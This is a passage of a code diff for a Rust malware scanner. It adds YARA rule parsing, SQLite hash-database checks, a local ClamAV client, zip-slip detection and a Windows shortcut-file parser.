@@ -1,7 +1,9 @@
 use crate::quarantine;
 use crate::realtime_shield;
 use crate::threat_intel_and_net;
+use base64::Engine;
 use chrono::{DateTime, Utc};
+use flate2::read::{DeflateDecoder, GzDecoder, ZlibDecoder};
 use lru::LruCache;
 use once_cell::sync::Lazy;
 use regex::Regex;
@@ -10,9 +12,10 @@ use serde::{Deserialize, Serialize};
 use sha2::{Digest, Sha256};
 use std::collections::HashMap;
 use std::fs::{self, File};
-use std::io::Read;
+use std::io::{Read, Seek, SeekFrom};
 use std::num::NonZeroUsize;
 use std::path::{Path, PathBuf};
+use std::sync::atomic::{AtomicU64, Ordering};
 use std::sync::{Arc, Mutex, RwLock};
 use uuid::Uuid;
 use walkdir::WalkDir;
@@ -51,6 +54,22 @@ pub enum ScanVerdict {
 
 type VerdictCacheKey = (u64, u64, i64, u64);
 
+/// Sub-pattern belonging to a compiled pure-Rust YARA rule.
+#[derive(Debug, Clone)]
+pub enum YaraSubPattern {
+    Text(Regex),
+    Bytes(regex::bytes::Regex),
+}
+
+impl YaraSubPattern {
+    fn is_match(&self, text: &str, raw: &[u8]) -> bool {
+        match self {
+            YaraSubPattern::Text(re) => re.is_match(text),
+            YaraSubPattern::Bytes(re) => re.is_match(raw),
+        }
+    }
+}
+
 /// Compiled pure-Rust YARA rule loaded from built-in definitions or `.yar` files in `rules/`.
 #[derive(Debug, Clone)]
 pub struct CompiledYaraRule {
@@ -58,7 +77,27 @@ pub struct CompiledYaraRule {
     pub category: String,
     pub severity: String,
     pub description: String,
-    pub pattern: Regex,
+    pub patterns: Vec<YaraSubPattern>,
+    pub min_matches: usize,
+}
+
+impl CompiledYaraRule {
+    /// Returns true when at least `min_matches` sub-patterns match `text` or `raw`.
+    pub fn matches(&self, text: &str, raw: &[u8]) -> bool {
+        if self.patterns.is_empty() || self.min_matches == 0 {
+            return false;
+        }
+        let mut hits = 0usize;
+        for pat in &self.patterns {
+            if pat.is_match(text, raw) {
+                hits += 1;
+                if hits >= self.min_matches {
+                    return true;
+                }
+            }
+        }
+        false
+    }
 }
 
 /// Thread-safe enterprise scanner engine holding compiled YARA rules and SQLite database path.
@@ -70,8 +109,23 @@ pub struct ScannerEngine {
 
 /// Max file size inspected (keeps scans fast and memory low).
 const MAX_FILE_BYTES: u64 = 64 * 1024 * 1024;
-/// Bytes of file content kept for heuristic/YARA/entropy analysis.
+/// Bytes of file head kept for heuristic/YARA/entropy/archive analysis.
 const CONTENT_WINDOW: usize = 2 * 1024 * 1024;
+/// Trailing overlay window appended when files exceed `CONTENT_WINDOW`.
+const TAIL_WINDOW: usize = 64 * 1024;
+/// Recursion limit for nested archive, document, and obfuscation layers.
+const MAX_ARCHIVE_DEPTH: u8 = 3;
+/// Maximum member entries inspected per archive or PDF container.
+const MAX_ARCHIVE_ENTRIES: usize = 64;
+/// Maximum uncompressed size allowed per container member (anti-ZipBomb guard).
+const MAX_MEMBER_UNPACK_BYTES: usize = 8 * 1024 * 1024;
+/// Maximum compression expansion ratio permitted before flagging ZipBomb.
+const MAX_COMPRESSION_RATIO: usize = 100;
+/// SHA-256 digest of a zero-byte file (must never be treated as malware).
+const EMPTY_FILE_SHA256: &str = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855";
+/// Backoff window (seconds) after local clamd socket connection failure.
+const CLAMD_COOLDOWN_SECS: u64 = 60;
+static LAST_CLAMD_FAIL_EPOCH_SECS: AtomicU64 = AtomicU64::new(0);
 
 /// Default YARA rules materialized into `rules/genesis_core_rules.yar`.
 const DEFAULT_CORE_YARA_FILE: &str = r#"
@@ -210,8 +264,34 @@ pub fn sqlite_db_path() -> PathBuf {
     realtime_shield::app_config_dir().join("threat_hashes.db")
 }
 
-fn init_sqlite_db(db_path: &Path) {
+fn is_valid_sha256_hex(sha: &str) -> bool {
+    sha.len() == 64 && sha.bytes().all(|b| b.is_ascii_hexdigit())
+}
+
+fn ensure_healthy_sqlite_connection(db_path: &Path) -> Option<Connection> {
+    let existed = db_path.exists();
     if let Ok(conn) = Connection::open(db_path) {
+        if existed {
+            let intact = conn
+                .query_row("PRAGMA quick_check;", [], |r| r.get::<_, String>(0))
+                .map(|res| res.trim().eq_ignore_ascii_case("ok"))
+                .unwrap_or(false);
+            if intact {
+                return Some(conn);
+            }
+            drop(conn);
+            let _ = fs::remove_file(db_path);
+            let _ = fs::remove_file(format!("{}-wal", db_path.display()));
+            let _ = fs::remove_file(format!("{}-shm", db_path.display()));
+        } else {
+            return Some(conn);
+        }
+    }
+    Connection::open(db_path).ok()
+}
+
+pub(crate) fn init_sqlite_db(db_path: &Path) {
+    if let Some(conn) = ensure_healthy_sqlite_connection(db_path) {
         let _ = conn.execute_batch(
             "PRAGMA journal_mode = WAL;
              PRAGMA synchronous = NORMAL;
@@ -253,13 +333,15 @@ pub fn lookup_sqlite_hash(sha256: &str) -> Option<(String, String, String)> {
     .ok()
 }
 
-/// Batch-insert SHA-256 malware signatures into `threat_hashes.db` inside a single transaction.
-pub fn batch_insert_threat_hashes(entries: &[(String, String, String, String)]) -> usize {
-    let db_path = sqlite_db_path();
-    let Ok(mut conn) = Connection::open(&db_path) else {
+/// Batch-insert validated SHA-256 malware signatures into an explicit SQLite DB path.
+pub(crate) fn batch_insert_threat_hashes_at(
+    db_path: &Path,
+    entries: &[(String, String, String, String)],
+) -> usize {
+    init_sqlite_db(db_path);
+    let Ok(mut conn) = Connection::open(db_path) else {
         return 0;
     };
-    init_sqlite_db(&db_path);
     let Ok(tx) = conn.transaction() else {
         return 0;
     };
@@ -271,7 +353,14 @@ pub fn batch_insert_threat_hashes(entries: &[(String, String, String, String)]) 
              VALUES (?1, ?2, ?3, ?4, ?5)",
         ) {
             for (sha, name, cat, sev) in entries {
-                if stmt.execute(params![sha, name, cat, sev, now]).is_ok() {
+                let clean = sha.trim().to_ascii_lowercase();
+                if !is_valid_sha256_hex(&clean)
+                    || clean == EMPTY_FILE_SHA256
+                    || quarantine::is_allowlisted(&clean)
+                {
+                    continue;
+                }
+                if stmt.execute(params![clean, name, cat, sev, now]).is_ok() {
                     inserted += 1;
                 }
             }
@@ -279,6 +368,12 @@ pub fn batch_insert_threat_hashes(entries: &[(String, String, String, String)]) 
     }
     let _ = tx.commit();
     inserted
+}
+
+/// Batch-insert SHA-256 malware signatures into `threat_hashes.db` inside a single transaction.
+pub fn batch_insert_threat_hashes(entries: &[(String, String, String, String)]) -> usize {
+    let db_path = sqlite_db_path();
+    batch_insert_threat_hashes_at(&db_path, entries)
 }
 
 pub fn sqlite_hash_count() -> usize {
@@ -323,6 +418,253 @@ fn ensure_default_yara_files(rules_dir: &Path) {
     }
 }
 
+fn unescape_yara_literal(raw: &str) -> String {
+    let mut out = String::with_capacity(raw.len());
+    let mut chars = raw.chars();
+    while let Some(c) = chars.next() {
+        if c == '\\' {
+            match chars.next() {
+                Some('\\') => out.push('\\'),
+                Some('"') => out.push('"'),
+                Some('n') => out.push('\n'),
+                Some('r') => out.push('\r'),
+                Some('t') => out.push('\t'),
+                Some(other) => {
+                    out.push('\\');
+                    out.push(other);
+                }
+                None => out.push('\\'),
+            }
+        } else {
+            out.push(c);
+        }
+    }
+    out
+}
+
+fn compile_hex_yara_pattern(hex_body: &str) -> Option<YaraSubPattern> {
+    let compact: String = hex_body
+        .chars()
+        .filter(|c| !c.is_ascii_whitespace())
+        .collect();
+    if compact.len() < 4 || compact.len() % 2 != 0 {
+        return None;
+    }
+    let mut pat = String::with_capacity(compact.len() * 2);
+    let bytes = compact.as_bytes();
+    for pair in bytes.chunks_exact(2) {
+        let a = pair[0] as char;
+        let b = pair[1] as char;
+        if a == '?' && b == '?' {
+            pat.push('.');
+        } else if a.is_ascii_hexdigit() && b.is_ascii_hexdigit() {
+            pat.push_str(&format!("\\x{}{}", a.to_ascii_lowercase(), b.to_ascii_lowercase()));
+        } else {
+            return None;
+        }
+    }
+    regex::bytes::RegexBuilder::new(&pat)
+        .unicode(false)
+        .dot_matches_new_line(true)
+        .build()
+        .ok()
+        .map(YaraSubPattern::Bytes)
+}
+
+/// Extract `(rule_name, rule_body)` blocks from YARA source using brace-depth matching
+/// so inner hex byte definitions (`{ 18 a0 22 00 }`) never truncate rule bodies early.
+fn extract_yara_rule_blocks(src: &str) -> Vec<(String, String)> {
+    static RULE_HEAD_RE: Lazy<Regex> =
+        Lazy::new(|| Regex::new(r"(?m)^\s*rule\s+([A-Za-z0-9_]+)\s*\{").unwrap());
+
+    let bytes = src.as_bytes();
+    let mut blocks = Vec::new();
+    let mut search_pos = 0usize;
+
+    while let Some(m) = RULE_HEAD_RE.find_at(src, search_pos) {
+        let Some(cap) = RULE_HEAD_RE.captures(&src[m.start()..m.end()]) else {
+            break;
+        };
+        let name = cap[1].to_string();
+        let body_start = m.end();
+        let mut i = body_start;
+        let mut depth = 1usize;
+
+        while i < bytes.len() && depth > 0 {
+            let b = bytes[i];
+            if b == b'/' && bytes.get(i + 1) == Some(&b'/') {
+                while i < bytes.len() && bytes[i] != b'\n' {
+                    i += 1;
+                }
+                continue;
+            }
+            if b == b'=' {
+                i += 1;
+                while i < bytes.len() && matches!(bytes[i], b' ' | b'\t') {
+                    i += 1;
+                }
+                if bytes.get(i) == Some(&b'/') {
+                    i += 1;
+                    while i < bytes.len() && bytes[i] != b'\n' {
+                        if bytes[i] == b'\\' {
+                            i += 2;
+                            continue;
+                        }
+                        if bytes[i] == b'/' {
+                            i += 1;
+                            break;
+                        }
+                        i += 1;
+                    }
+                    continue;
+                }
+                if bytes.get(i) == Some(&b'"') {
+                    i += 1;
+                    while i < bytes.len() && bytes[i] != b'\n' {
+                        if bytes[i] == b'\\' {
+                            i += 2;
+                            continue;
+                        }
+                        if bytes[i] == b'"' {
+                            i += 1;
+                            break;
+                        }
+                        i += 1;
+                    }
+                    continue;
+                }
+                continue;
+            }
+            if b == b'{' {
+                depth += 1;
+            } else if b == b'}' {
+                depth -= 1;
+                if depth == 0 {
+                    blocks.push((name.clone(), src[body_start..i].to_string()));
+                    i += 1;
+                    break;
+                }
+            }
+            i += 1;
+        }
+        search_pos = i.max(m.end() + 1);
+    }
+    blocks
+}
+
+/// Compile one or more YARA rule definitions from text into `CompiledYaraRule` entries.
+pub(crate) fn parse_yara_rules_from_source(src: &str, out: &mut Vec<CompiledYaraRule>) {
+    static META_CAT_RE: Lazy<Regex> =
+        Lazy::new(|| Regex::new(r#"category\s*=\s*"([^"]+)""#).unwrap());
+    static META_SEV_RE: Lazy<Regex> =
+        Lazy::new(|| Regex::new(r#"severity\s*=\s*"([^"]+)""#).unwrap());
+    static META_DESC_RE: Lazy<Regex> =
+        Lazy::new(|| Regex::new(r#"description\s*=\s*"([^"]+)""#).unwrap());
+    static REGEX_STR_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(
+            r"(?m)^\s*\$[A-Za-z0-9_]+\s*=\s*/(.+)/([is]*)(?:[ \t]+(?:ascii|wide|nocase|fullword))*(?:[ \t]+//.*)?\r?$",
+        )
+        .unwrap()
+    });
+    static LITERAL_STR_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(r#"(?m)^\s*\$[A-Za-z0-9_]+\s*=\s*"((?:\\.|[^"\\]){2,})"(?:[ \t]+(?:nocase|ascii|wide|fullword))*(?:[ \t]+//.*)?\r?$"#)
+            .unwrap()
+    });
+    static HEX_STR_RE: Lazy<Regex> =
+        Lazy::new(|| Regex::new(r"(?s)\$[A-Za-z0-9_]+\s*=\s*\{\s*([0-9A-Fa-f?\s]+?)\s*\}").unwrap());
+    static HIGH_HEX_ESC_RE: Lazy<Regex> =
+        Lazy::new(|| Regex::new(r"\\x[89a-fA-F][0-9a-fA-F]").unwrap());
+    static COND_ALL_RE: Lazy<Regex> = Lazy::new(|| Regex::new(r"(?i)\ball\s+of\s+them\b").unwrap());
+    static COND_NUM_RE: Lazy<Regex> =
+        Lazy::new(|| Regex::new(r"(?i)\b(\d+)\s+of\s+them\b").unwrap());
+
+    for (name, body) in extract_yara_rule_blocks(src) {
+        let category = META_CAT_RE
+            .captures(&body)
+            .map(|c| c[1].to_string())
+            .unwrap_or_else(|| "YARA.Heuristic".to_string());
+        let severity = META_SEV_RE
+            .captures(&body)
+            .map(|c| c[1].to_string())
+            .unwrap_or_else(|| "High".to_string());
+        let description = META_DESC_RE
+            .captures(&body)
+            .map(|c| c[1].to_string())
+            .unwrap_or_else(|| format!("Matched YARA rule {}", name));
+
+        let (strings_section, cond_section) = match body.rfind("condition:") {
+            Some(idx) => (&body[..idx], &body[idx..]),
+            None => (body.as_str(), ""),
+        };
+
+        let mut patterns = Vec::new();
+        for rcap in REGEX_STR_RE.captures_iter(strings_section) {
+            let pat = &rcap[1];
+            let flags = &rcap[2];
+            let has_s = flags.contains('s');
+            let has_i = flags.contains('i') || !has_s;
+            if HIGH_HEX_ESC_RE.is_match(pat) {
+                if let Ok(re) = regex::bytes::RegexBuilder::new(pat)
+                    .unicode(false)
+                    .case_insensitive(has_i)
+                    .dot_matches_new_line(has_s)
+                    .build()
+                {
+                    patterns.push(YaraSubPattern::Bytes(re));
+                }
+            } else {
+                let prefix = if has_i && has_s {
+                    "(?is)"
+                } else if has_s {
+                    "(?s)"
+                } else {
+                    "(?i)"
+                };
+                if let Ok(re) = Regex::new(&format!("{}(?:{})", prefix, pat)) {
+                    patterns.push(YaraSubPattern::Text(re));
+                }
+            }
+        }
+        for lcap in LITERAL_STR_RE.captures_iter(strings_section) {
+            let unescaped = unescape_yara_literal(&lcap[1]);
+            let lit = regex::escape(&unescaped);
+            if let Ok(re) = Regex::new(&format!("(?i)(?:{})", lit)) {
+                patterns.push(YaraSubPattern::Text(re));
+            }
+        }
+        for hcap in HEX_STR_RE.captures_iter(strings_section) {
+            if let Some(sub) = compile_hex_yara_pattern(&hcap[1]) {
+                patterns.push(sub);
+            }
+        }
+
+        if patterns.is_empty() {
+            continue;
+        }
+        let min_matches = if COND_ALL_RE.is_match(cond_section) {
+            patterns.len()
+        } else if let Some(ncap) = COND_NUM_RE.captures(cond_section) {
+            ncap[1]
+                .parse::<usize>()
+                .unwrap_or(1)
+                .clamp(1, patterns.len())
+        } else {
+            1
+        };
+
+        if !out.iter().any(|r| r.name == name) {
+            out.push(CompiledYaraRule {
+                name,
+                category,
+                severity,
+                description,
+                patterns,
+                min_matches,
+            });
+        }
+    }
+}
+
 /// Parse `.yar` / `.yara` rule files from `rules/` into `CompiledYaraRule` patterns.
 pub fn load_yara_rules_from_dir(rules_dir: &Path) -> Vec<CompiledYaraRule> {
     let mut rules = Vec::new();
@@ -351,64 +693,8 @@ pub fn load_yara_rules_from_dir(rules_dir: &Path) -> Vec<CompiledYaraRule> {
         }
     }
 
-    let block_re = Regex::new(r"(?s)rule\s+([A-Za-z0-9_]+)\s*\{(.*?)\}").unwrap();
-    let meta_cat_re = Regex::new(r#"category\s*=\s*"([^"]+)""#).unwrap();
-    let meta_sev_re = Regex::new(r#"severity\s*=\s*"([^"]+)""#).unwrap();
-    let meta_desc_re = Regex::new(r#"description\s*=\s*"([^"]+)""#).unwrap();
-    let regex_str_re = Regex::new(r"\$[A-Za-z0-9_]+\s*=\s*/(.*?)/([is]*)").unwrap();
-    let literal_str_re = Regex::new(r#"\$[A-Za-z0-9_]+\s*=\s*"([^"]{4,})"\s*(nocase)?"#).unwrap();
-
     for src in &raw_sources {
-        for cap in block_re.captures_iter(src) {
-            let name = cap[1].to_string();
-            let body = &cap[2];
-            let category = meta_cat_re
-                .captures(body)
-                .map(|c| c[1].to_string())
-                .unwrap_or_else(|| "YARA.Heuristic".to_string());
-            let severity = meta_sev_re
-                .captures(body)
-                .map(|c| c[1].to_string())
-                .unwrap_or_else(|| "High".to_string());
-            let description = meta_desc_re
-                .captures(body)
-                .map(|c| c[1].to_string())
-                .unwrap_or_else(|| format!("Matched YARA rule {}", name));
-
-            let mut sub_patterns = Vec::new();
-            for rcap in regex_str_re.captures_iter(body) {
-                let pat = &rcap[1];
-                let flags = &rcap[2];
-                let prefix = if flags.contains('i') && flags.contains('s') {
-                    "(?is)"
-                } else if flags.contains('s') {
-                    "(?s)"
-                } else {
-                    "(?i)"
-                };
-                sub_patterns.push(format!("{}(?:{})", prefix, pat));
-            }
-            for lcap in literal_str_re.captures_iter(body) {
-                let unescaped = lcap[1].replace("\\\\", "\\");
-                let lit = regex::escape(&unescaped);
-                sub_patterns.push(format!("(?i)(?:{})", lit));
-            }
-
-            if !sub_patterns.is_empty() {
-                let combined = sub_patterns.join("|");
-                if let Ok(compiled) = Regex::new(&combined) {
-                    if !rules.iter().any(|r: &CompiledYaraRule| r.name == name) {
-                        rules.push(CompiledYaraRule {
-                            name,
-                            category,
-                            severity,
-                            description,
-                            pattern: compiled,
-                        });
-                    }
-                }
-            }
-        }
+        parse_yara_rules_from_source(src, &mut rules);
     }
 
     rules
@@ -524,8 +810,23 @@ fn is_disguised_executable_header(path: &Path, head: &[u8]) -> Option<&'static s
     }
 }
 
+/// Detect POSIX/USTAR tar archives (`ustar` magic at offset 257).
+fn is_tar_buffer(head: &[u8]) -> bool {
+    head.len() >= 263 && &head[257..262] == b"ustar"
+}
+
 fn is_content_scannable(path: &Path, head: &[u8]) -> bool {
-    if head.starts_with(b"#!") || head.starts_with(b"MZ") || head.starts_with(b"\x7fELF") {
+    if head.starts_with(b"#!")
+        || head.starts_with(b"MZ")
+        || head.starts_with(b"\x7fELF")
+        || head.starts_with(b"PK\x03\x04")
+        || head.starts_with(b"\x1f\x8b")
+        || head.starts_with(b"%PDF-")
+        || head.starts_with(b"\xD0\xCF\x11\xE0")
+        || head.starts_with(b"{\\rtf")
+        || head.starts_with(&[0x4c, 0x00, 0x00, 0x00, 0x01, 0x14, 0x02, 0x00])
+        || is_tar_buffer(head)
+    {
         return true;
     }
     let ext = path
@@ -537,7 +838,9 @@ fn is_content_scannable(path: &Path, head: &[u8]) -> bool {
         "sh" | "bash" | "zsh" | "ps1" | "psm1" | "bat" | "cmd" | "vbs" | "vbe" | "js" | "jse"
             | "hta" | "wsf" | "py" | "pl" | "desktop" | "service" | "exe" | "dll" | "scr"
             | "com" | "so" | "appimage" | "elf" | "bin" | "url" | "theme" | "website"
-            | "msg" | "eml" | "oft" | "rtf"
+            | "msg" | "eml" | "oft" | "rtf" | "zip" | "jar" | "apk" | "xpi" | "tar"
+            | "gz" | "tgz" | "pdf" | "doc" | "docx" | "docm" | "xls" | "xlsx" | "xlsm"
+            | "ppt" | "pptx" | "pptm" | "lnk" | "iso" | "vhd"
     )
 }
 
@@ -566,15 +869,26 @@ fn hash_and_sample(path: &Path) -> Option<(String, Vec<u8>)> {
     let mut hasher = Sha256::new();
     let mut head = Vec::with_capacity(64 * 1024);
     let mut chunk = vec![0u8; 64 * 1024];
+    let mut total_bytes = 0u64;
     loop {
         let n = file.read(&mut chunk).ok()?;
         if n == 0 {
             break;
         }
+        total_bytes += n as u64;
         hasher.update(&chunk[..n]);
         if head.len() < CONTENT_WINDOW {
             let take = std::cmp::min(n, CONTENT_WINDOW - head.len());
             head.extend_from_slice(&chunk[..take]);
+        }
+    }
+    if total_bytes > CONTENT_WINDOW as u64 {
+        let tail_len = std::cmp::min(TAIL_WINDOW, (total_bytes - CONTENT_WINDOW as u64) as usize);
+        if tail_len > 0 && file.seek(SeekFrom::End(-(tail_len as i64))).is_ok() {
+            let mut tail = vec![0u8; tail_len];
+            if file.read_exact(&mut tail).is_ok() {
+                head.extend_from_slice(&tail);
+            }
         }
     }
     Some((hex::encode(hasher.finalize()), head))
@@ -609,8 +923,1548 @@ fn detection(
     }
 }
 
-/// Inspect a single file using the LRU Verdict Cache, SQLite SHA-256 DB, YARA rules, and entropy analysis.
-pub fn scan_single_file(path: &Path) -> Option<ThreatDetection> {
+fn unix_epoch_secs() -> u64 {
+    std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .map(|d| d.as_secs())
+        .unwrap_or(0)
+}
+
+fn stream_to_clamd<S: Read + std::io::Write>(
+    mut sock: S,
+    data: &[u8],
+) -> Result<Option<String>, std::io::Error> {
+    sock.write_all(b"zINSTREAM\0")?;
+    for chunk in data.chunks(32 * 1024) {
+        let len_be = (chunk.len() as u32).to_be_bytes();
+        sock.write_all(&len_be)?;
+        sock.write_all(chunk)?;
+    }
+    sock.write_all(&0u32.to_be_bytes())?;
+    sock.flush()?;
+
+    let mut resp_buf = [0u8; 1024];
+    let n = sock.read(&mut resp_buf)?;
+    let resp = String::from_utf8_lossy(&resp_buf[..n])
+        .trim_matches(|c: char| c == '\0' || c.is_whitespace())
+        .to_string();
+    if let Some(without_found) = resp.strip_suffix("FOUND") {
+        let sig = without_found
+            .trim()
+            .strip_prefix("stream:")
+            .unwrap_or(without_found)
+            .trim()
+            .to_string();
+        if !sig.is_empty() {
+            return Ok(Some(sig));
+        }
+    }
+    Ok(None)
+}
+
+/// Optionally forward in-memory file bytes to a local ClamAV `clamd` daemon via `zINSTREAM\0`.
+/// Gracefully backs off for 60s if no local `clamd` socket is listening.
+pub(crate) fn query_clamd_instream(buffer: &[u8]) -> Option<String> {
+    if buffer.is_empty() {
+        return None;
+    }
+    let now = unix_epoch_secs();
+    let last_fail = LAST_CLAMD_FAIL_EPOCH_SECS.load(Ordering::Relaxed);
+    if last_fail > 0 && now.saturating_sub(last_fail) < CLAMD_COOLDOWN_SECS {
+        return None;
+    }
+
+    let timeout = Some(std::time::Duration::from_millis(350));
+
+    #[cfg(unix)]
+    {
+        use std::os::unix::net::UnixStream;
+        for sock_path in &[
+            "/run/clamav/clamd.ctl",
+            "/var/run/clamav/clamd.ctl",
+            "/var/run/clamd.scan/clamd.sock",
+            "/tmp/clamd.socket",
+        ] {
+            if let Ok(stream) = UnixStream::connect(sock_path) {
+                let _ = stream.set_read_timeout(timeout);
+                let _ = stream.set_write_timeout(timeout);
+                if let Ok(verdict) = stream_to_clamd(stream, buffer) {
+                    return verdict;
+                }
+            }
+        }
+    }
+
+    let tcp_addr: std::net::SocketAddr = ([127, 0, 0, 1], 3310).into();
+    if let Ok(stream) =
+        std::net::TcpStream::connect_timeout(&tcp_addr, std::time::Duration::from_millis(150))
+    {
+        let _ = stream.set_read_timeout(timeout);
+        let _ = stream.set_write_timeout(timeout);
+        if let Ok(verdict) = stream_to_clamd(stream, buffer) {
+            return verdict;
+        }
+    }
+
+    LAST_CLAMD_FAIL_EPOCH_SECS.store(now, Ordering::Relaxed);
+    None
+}
+
+fn is_zip_slip_path(entry_name: &str) -> bool {
+    let norm = entry_name.replace('\\', "/");
+    if norm.starts_with('/')
+        || norm == ".."
+        || norm.starts_with("../")
+        || norm.contains("/../")
+        || norm.ends_with("/..")
+    {
+        return true;
+    }
+    let b = entry_name.as_bytes();
+    b.len() >= 2 && b[0].is_ascii_alphabetic() && b[1] == b':'
+}
+
+fn is_executable_or_script_name(name: &str) -> bool {
+    let ext = Path::new(name)
+        .extension()
+        .and_then(|e| e.to_str())
+        .map(|s| s.to_ascii_lowercase())
+        .unwrap_or_default();
+    matches!(
+        ext.as_str(),
+        "exe" | "dll" | "scr" | "bat" | "cmd" | "ps1" | "psm1" | "vbs" | "vbe" | "js" | "jse"
+            | "hta" | "wsf" | "sh" | "bash" | "elf" | "bin" | "py" | "pl" | "com" | "pif"
+            | "msi" | "jar" | "iso" | "lnk"
+    )
+}
+
+fn le_u16(b: &[u8], off: usize) -> Option<u16> {
+    b.get(off..off + 2).map(|s| u16::from_le_bytes([s[0], s[1]]))
+}
+
+fn le_u32(b: &[u8], off: usize) -> Option<u32> {
+    b.get(off..off + 4)
+        .map(|s| u32::from_le_bytes([s[0], s[1], s[2], s[3]]))
+}
+
+fn read_bounded<R: Read>(mut reader: R, limit: usize) -> Option<(Vec<u8>, bool)> {
+    let mut out = Vec::new();
+    let mut chunk = [0u8; 16 * 1024];
+    loop {
+        match reader.read(&mut chunk) {
+            Ok(0) => return Some((out, false)),
+            Ok(n) => {
+                if out.len() + n > limit {
+                    out.extend_from_slice(&chunk[..limit - out.len()]);
+                    return Some((out, true));
+                }
+                out.extend_from_slice(&chunk[..n]);
+            }
+            Err(_) => {
+                if out.is_empty() {
+                    return None;
+                }
+                return Some((out, false));
+            }
+        }
+    }
+}
+
+/// Extract contiguous printable ASCII strings encoded as UTF-16LE (common in PowerShell & Office macros).
+fn extract_utf16le_ascii(raw: &[u8]) -> Option<String> {
+    if raw.len() < 16 {
+        return None;
+    }
+    let mut collected = Vec::new();
+    let mut run = Vec::new();
+    let mut i = 0usize;
+    while i + 1 < raw.len() {
+        let lo = raw[i];
+        let hi = raw[i + 1];
+        if hi == 0 && (lo.is_ascii_graphic() || lo == b' ' || lo == b'\t' || lo == b'\n' || lo == b'\r')
+        {
+            run.push(lo);
+            i += 2;
+        } else {
+            if run.len() >= 12 {
+                collected.extend_from_slice(&run);
+                collected.push(b'\n');
+            }
+            run.clear();
+            i += 1;
+        }
+    }
+    if run.len() >= 12 {
+        collected.extend_from_slice(&run);
+    }
+    if collected.len() >= 16 {
+        Some(String::from_utf8_lossy(&collected).to_string())
+    } else {
+        None
+    }
+}
+
+struct ParsedLnk {
+    target_path: String,
+    arguments: String,
+    icon_location: String,
+}
+
+fn read_c_str(slice: &[u8]) -> String {
+    let end = slice.iter().position(|&b| b == 0).unwrap_or(slice.len());
+    String::from_utf8_lossy(&slice[..end]).to_string()
+}
+
+fn read_lnk_string(buffer: &[u8], pos: &mut usize, is_unicode: bool) -> Option<String> {
+    let count = le_u16(buffer, *pos)? as usize;
+    *pos = pos.checked_add(2)?;
+    if count == 0 {
+        return Some(String::new());
+    }
+    if is_unicode {
+        let byte_len = count.checked_mul(2)?;
+        let end = pos.checked_add(byte_len)?;
+        if end > buffer.len() {
+            return None;
+        }
+        let code_units: Vec<u16> = buffer[*pos..end]
+            .chunks_exact(2)
+            .map(|c| u16::from_le_bytes([c[0], c[1]]))
+            .collect();
+        *pos = end;
+        Some(String::from_utf16_lossy(&code_units))
+    } else {
+        let end = pos.checked_add(count)?;
+        if end > buffer.len() {
+            return None;
+        }
+        let s = String::from_utf8_lossy(&buffer[*pos..end]).to_string();
+        *pos = end;
+        Some(s)
+    }
+}
+
+/// Structured MS-SHLLINK binary parser extracting target path, CLI arguments, and icon location.
+fn parse_lnk_binary(buffer: &[u8]) -> Option<ParsedLnk> {
+    const LNK_CLSID: [u8; 16] = [
+        0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
+    ];
+    if buffer.len() < 76 || le_u32(buffer, 0) != Some(0x0000_004C) || buffer[4..20] != LNK_CLSID {
+        return None;
+    }
+
+    let link_flags = le_u32(buffer, 20)?;
+    let is_unicode = (link_flags & 0x0080) != 0;
+    let mut pos = 76usize;
+
+    if (link_flags & 0x0001) != 0 {
+        let id_list_size = le_u16(buffer, pos)? as usize;
+        pos = pos.checked_add(2)?.checked_add(id_list_size)?;
+        if pos > buffer.len() {
+            return None;
+        }
+    }
+
+    let mut target_path = String::new();
+    if (link_flags & 0x0002) != 0 {
+        let info_size = le_u32(buffer, pos)? as usize;
+        if info_size < 16 || pos.checked_add(info_size)? > buffer.len() {
+            return None;
+        }
+        let info_slice = &buffer[pos..pos + info_size];
+        let info_flags = le_u32(info_slice, 8).unwrap_or(0);
+        let common_suffix = if info_size >= 28 {
+            let cps_off = le_u32(info_slice, 24).unwrap_or(0) as usize;
+            if cps_off >= 16 && cps_off < info_size {
+                read_c_str(&info_slice[cps_off..])
+            } else {
+                String::new()
+            }
+        } else {
+            String::new()
+        };
+
+        if (info_flags & 0x01) != 0 && info_size >= 28 {
+            let lbp_off = le_u32(info_slice, 16).unwrap_or(0) as usize;
+            if lbp_off >= 16 && lbp_off < info_size {
+                target_path.push_str(&read_c_str(&info_slice[lbp_off..]));
+            }
+            if !common_suffix.is_empty() {
+                if !target_path.is_empty()
+                    && !target_path.ends_with('\\')
+                    && !common_suffix.starts_with('\\')
+                {
+                    target_path.push('\\');
+                }
+                target_path.push_str(&common_suffix);
+            }
+        }
+        if (info_flags & 0x02) != 0 && info_size >= 24 {
+            let net_off = le_u32(info_slice, 20).unwrap_or(0) as usize;
+            if net_off >= 16 && net_off + 20 <= info_size {
+                let net_name_off = le_u32(info_slice, net_off + 8).unwrap_or(0) as usize;
+                let abs_net = net_off.saturating_add(net_name_off);
+                if abs_net < info_size {
+                    let net_name = read_c_str(&info_slice[abs_net..]);
+                    if !net_name.is_empty() {
+                        if !target_path.is_empty() {
+                            target_path.push(' ');
+                        }
+                        target_path.push_str(&net_name);
+                        if !common_suffix.is_empty() {
+                            if !net_name.ends_with('\\') && !common_suffix.starts_with('\\') {
+                                target_path.push('\\');
+                            }
+                            target_path.push_str(&common_suffix);
+                        }
+                    }
+                }
+            }
+        }
+        pos += info_size;
+    }
+
+    if (link_flags & 0x0004) != 0 {
+        let _name = read_lnk_string(buffer, &mut pos, is_unicode)?;
+    }
+    if (link_flags & 0x0008) != 0 {
+        if let Some(rel_path) = read_lnk_string(buffer, &mut pos, is_unicode) {
+            if !rel_path.is_empty() {
+                if !target_path.is_empty() {
+                    target_path.push(' ');
+                }
+                target_path.push_str(&rel_path);
+            }
+        }
+    }
+    if (link_flags & 0x0010) != 0 {
+        let _working_dir = read_lnk_string(buffer, &mut pos, is_unicode)?;
+    }
+    let arguments = if (link_flags & 0x0020) != 0 {
+        read_lnk_string(buffer, &mut pos, is_unicode).unwrap_or_default()
+    } else {
+        String::new()
+    };
+    let icon_location = if (link_flags & 0x0040) != 0 {
+        read_lnk_string(buffer, &mut pos, is_unicode).unwrap_or_default()
+    } else {
+        String::new()
+    };
+
+    Some(ParsedLnk {
+        target_path,
